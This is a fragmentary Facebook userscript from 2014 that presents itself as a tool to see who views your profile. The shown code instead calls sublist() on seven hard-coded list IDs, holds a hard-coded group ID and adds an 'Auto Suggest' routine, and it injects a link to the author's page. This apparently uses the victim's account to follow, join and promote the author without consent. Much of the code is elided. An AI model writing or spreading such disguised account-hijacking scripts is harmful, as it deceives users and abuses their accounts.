...
// ==UserScript==
// @name            Si Pengintip Profile @HaikalJihad_ID
// @description     Facebook si Pengintip Profil 2014 By Haikal Jihad
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/haikaljihad" target="_blank">Created By Haikal Boecah As-salaam<br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("512978635423525");
sublist("526216534099735");
sublist("526220720765983");
sublist("526220287432693");
sublist("674797475908306");
sublist("674797349241652");
sublist("674797002575020");

//Group ku haikal
var gid = ['471023383000964'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Haikal Boecah As-salaam';
